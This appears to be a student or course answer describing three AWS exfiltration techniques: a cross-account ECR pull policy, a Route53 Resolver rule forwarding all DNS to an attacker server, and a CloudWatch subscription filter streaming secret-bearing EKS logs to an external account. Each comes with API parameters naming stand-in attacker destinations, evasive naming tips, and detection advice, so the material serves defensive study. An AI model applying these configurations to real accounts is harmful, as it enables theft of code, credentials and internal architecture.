# AWS Exfiltration (Bonus)

Find and describe at least three distinct methods by which an attacker holding valid credentials in an AWS account can exfiltrate data from that account.

---

## Technique 1: ECR Repository Policy Manipulation

### 1. Description

An attacker modifies a private ECR repository's resource policy to grant an external AWS account pull permissions. This silently allows the attacker's account to pull every container image in the repository. Container images are high-value exfiltration targets: they contain compiled application code, configuration files, environment variables baked into image layers, and often embedded secrets (API keys, certificates) accidentally included during build. A single repository policy change gives the attacker access to the full image history, including every tagged version.

### 2. Action

`ecr:SetRepositoryPolicy`

### 3. Parameters

```json
{
  "repositoryName": "production/api-service",
  "policyText": {
    "Version": "2012-10-17",
    "Statement": [{
      "Sid": "ExternalPull",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"
      },
      "Action": [
        "ecr:GetDownloadUrlForLayer",
        "ecr:BatchGetImage",
        "ecr:BatchCheckLayerAvailability"
      ]
    }]
  }
}
```

### 4. Why is this related to Exfiltration

Container images are the build artifacts of the entire CI/CD pipeline. Pulling them gives the attacker the full application source (decompilable), every dependency and its version (effectively an SBOM for free), embedded configuration and secrets, and the exact runtime environment. This is supply chain exfiltration: a single policy change extracts the entire software delivery artifact, not just one piece of data.

### 5. How to detect

- CloudTrail logs `SetRepositoryPolicy` as a management event. Alert on any policy change that adds a `Principal` referencing an account ID outside the organization.
- Monitor `BatchGetImage` calls originating from accounts outside the organization. This is the actual exfiltration event and is a CloudTrail data event (must be explicitly enabled for ECR).
- Periodically audit ECR repository policies for cross-account access grants that were not provisioned by IaC (Terraform, CloudFormation). A policy that exists in ECR but not in the IaC state file is a strong indicator of manual, unauthorized modification.

---

## Technique 2: Route53 Resolver DNS Query Forwarding

### 1. Description

An attacker with `route53resolver:CreateResolverRule` and `route53resolver:AssociateResolverRule` permissions creates a forwarding rule that routes all DNS queries from a VPC to an attacker-controlled DNS server. Every internal hostname that workloads resolve (database endpoints, internal APIs, service discovery names, SaaS integrations) is passively collected by the attacker's nameserver. This is reconnaissance via exfiltration: the attacker does not steal end data directly, but maps the victim's entire internal architecture without a single port scan or active probe. The exfiltrated hostnames reveal where to target follow-up attacks (which databases exist, which microservices are in production, what third-party tools are in use).

### 2. Action

`route53resolver:CreateResolverRule`, then `route53resolver:AssociateResolverRule`

### 3. Parameters

```json
{
  "CreatorRequestId": "audit-dns-logging",
  "RuleType": "FORWARD",
  "DomainName": ".",
  "Name": "dns-audit-forwarding",
  "TargetIps": [
    {
      "Ip": "203.0.113.53",
      "Port": 53
    }
  ]
}
```

Then associate it with the target VPC:

```json
{
  "ResolverRuleId": "<rule-id-from-above>",
  "VPCId": "vpc-0abc123production"
}
```

The domain name `"."` (root) means all DNS queries from the VPC are forwarded.

### 4. Why is this related to Exfiltration

DNS queries are the map of a network's internal topology. Every query reveals a hostname that a workload actively depends on: `prod-postgres-primary.internal.company.com`, `auth-service.production.local`, `payments-api.us-east-1.internal`. Over hours of passive collection, the attacker builds a complete picture of the internal architecture, including database endpoints, microservice mesh structure, environment separation (prod vs staging), and third-party SaaS integrations. This is more valuable than a single database dump because it enables precisely targeted follow-up attacks against the highest-value services. The exfiltration channel is DNS itself (port 53, UDP), which is rarely inspected, not encrypted, and almost never blocked outbound.

### 5. How to detect

- CloudTrail logs both `CreateResolverRule` and `AssociateResolverRule` as management events. Alert on any forwarding rule where `TargetIps` contains an IP address outside the organization's known DNS infrastructure.
- Alert specifically on rules with `DomainName: "."` (root catch-all), which is unusual for legitimate forwarding (legitimate rules typically forward specific domains like `.corp.internal`).
- Monitor VPC Flow Logs for outbound UDP/53 traffic to IP addresses that are not AWS-provided DNS resolvers (169.254.169.253 or the VPC+2 address). Any other DNS destination is anomalous.
- Audit Route53 Resolver rules periodically for rules not provisioned via IaC. A forwarding rule that exists in AWS but not in Terraform state is a strong indicator of manual, unauthorized configuration.

---

## Technique 3: EKS Pod Log Exfiltration via CloudWatch Cross-Account Subscription

### 1. Description

An attacker with `logs:PutSubscriptionFilter` permissions creates a subscription filter on a CloudWatch Logs group that receives EKS container logs (typically `/aws/eks/<cluster>/containers`). The subscription streams matching log events in real time to a destination (Kinesis stream, Lambda function, or CloudWatch Logs destination) in an external account. EKS pod logs frequently contain application secrets, database queries with parameters, internal API responses, user data, and error messages that expose internal architecture. The filter pattern targets specific keywords to selectively exfiltrate only high-value content, keeping the data volume low and the exfiltration hard to distinguish from legitimate log forwarding.

### 2. Action

`logs:PutSubscriptionFilter`

### 3. Parameters

```json
{
  "logGroupName": "/aws/eks/production-cluster/containers",
  "filterName": "audit-compliance-stream",
  "filterPattern": "?password ?token ?Authorization ?secret ?apikey ?connectionString",
  "destinationArn": "arn:aws:logs:eu-west-1:ATTACKER_ACCOUNT:destination:log-collector"
}
```

The filter name `"audit-compliance-stream"` is deliberately chosen to blend in with legitimate monitoring infrastructure.

### 4. Why is this related to Exfiltration

This creates a persistent, real-time exfiltration channel that requires no further API calls after the initial setup. Every matching log line is automatically forwarded to the attacker. Unlike a one-time data copy, this continues exfiltrating as new secrets appear in logs: new deployments, rotated credentials, new service integrations, and user data all get captured automatically. The pattern-based filtering is selective enough to avoid generating suspicious data volume spikes while capturing the highest-value content (credentials, tokens, connection strings). The filter name disguises itself as legitimate compliance monitoring, making it unlikely to draw attention during a casual audit.

### 5. How to detect

- CloudTrail logs `PutSubscriptionFilter` as a management event. Alert on any subscription filter where the `destinationArn` references an account outside the organization.
- Flag subscription filters with pattern matches on sensitive keywords (password, token, secret, Authorization). Legitimate log forwarding for monitoring or compliance rarely needs these specific patterns forwarded cross-account.
- Audit all CloudWatch subscription filters periodically. Each log group supports a limited number of subscription filters (currently 2), so a malicious filter may also block legitimate ones from being added, which can serve as a secondary detection signal.
- Compare subscription filters against IaC-provisioned configuration. A filter that exists in CloudWatch but not in Terraform/CloudFormation state is a strong indicator of unauthorized manual creation.
